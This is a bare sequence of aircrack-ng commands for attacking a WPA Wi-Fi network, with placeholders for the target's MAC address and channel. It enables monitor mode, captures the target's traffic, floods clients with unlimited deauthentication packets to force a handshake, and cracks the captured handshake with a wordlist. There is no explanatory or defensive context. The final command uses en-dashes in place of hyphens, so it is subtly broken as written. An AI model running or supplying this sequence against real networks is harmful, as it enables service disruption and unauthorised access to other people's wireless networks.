airmon-ng
airmon-ng start wlan0
airodump-ng mon0
airodump-ng -c <CONNECTION_CHANNEL> --bssid <MAC_ADDR> -w ~/defcon mon0
aireplay-ng -0 0 -a <MAC_ADDR> mon0
aircrack-ng –b <MAC_ADDR> –w /root/wordlist.txt ~/defcon*.cap


